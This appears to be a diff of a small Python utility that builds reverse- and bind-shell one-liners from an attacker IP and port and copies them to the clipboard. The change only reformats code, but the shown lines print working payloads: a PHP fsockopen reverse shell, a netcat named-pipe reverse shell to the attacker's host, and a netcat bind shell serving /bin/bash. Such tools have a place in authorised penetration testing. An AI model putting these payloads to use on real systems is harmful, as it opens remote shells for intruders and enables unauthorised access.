@@ -11,38 +11,16 @@ import pyperclip
 # Arg Parser
 parser = argparse.ArgumentParser(description="Easy copy-pasta my shells.")
 parser.add_argument(
-    "-i",
-    "--localIP",
-    action="store",
-    dest="attackerIP",
-    help="Your box's IP.",
-    required=True,
+    "-i", "--localIP", action="store", dest="attackerIP", help="Your box's IP.", required=True,
 )
 parser.add_argument(
-    "-p",
-    "--port",
-    action="store",
-    dest="port",
-    help="Port to connect to.",
-    required=True,
+    "-p", "--port", action="store", dest="port", help="Port to connect to.", required=True,
 )
 parser.add_argument(
-    "-l",
-    "--language",
-    action="store",
-    dest="language",
-    help="Language to create shell.",
-    required=True,
-    type=str,
+    "-l", "--language", action="store", dest="language", help="Language to create shell.", required=True, type=str,
 )
 parser.add_argument(
-    "-s",
-    "--shelltype",
-    action="store",
-    dest="shellType",
-    help="Reverse or Bind shell.",
-    required=False,
-    type=str,
+    "-s", "--shelltype", action="store", dest="shellType", help="Reverse or Bind shell.", required=False, type=str,
 )
 args = parser.parse_args()
 
@@ -64,9 +42,7 @@ def ezShell():
         print(
             f'[+] PHP Reverse shell:\n php -r \'$sock=fsockopen("{attackerIP}",{port});exec("/bin/sh -i <&3 >&3 2>&3");\' '
         )
-        pyperclip.copy(
-            f'php -r \'$sock=fsockopen("{attackerIP}",{port});exec("/bin/sh -i <&3 >&3 2>&3");\''
-        )
+        pyperclip.copy(f'php -r \'$sock=fsockopen("{attackerIP}",{port});exec("/bin/sh -i <&3 >&3 2>&3");\'')
         print()
     elif language == "python":
         print(
@@ -89,9 +65,7 @@ def ezShell():
         print(
             f"[+] Netcat without the -e option:\n mknod /tmp/backpipe p;/bin/sh 0</tmp/backpipe | nc {attackerIP} {port} 1>/tmp/backpipe"
         )
-        pyperclip.copy(
-            f"mknod /tmp/backpipe p && /bin/sh 0</tmp/backpipe | nc {attackerIP} {port} 1>/tmp/backpipe"
-        )
+        pyperclip.copy(f"mknod /tmp/backpipe p && /bin/sh 0</tmp/backpipe | nc {attackerIP} {port} 1>/tmp/backpipe")
     elif language == "ncb":
         print(f"[+] Netcat bind shell:\n nc -vlp 5555 -e /bin/bash")
         pyperclip.copy(f"nc -vlp 5555 -e /bin/bash")
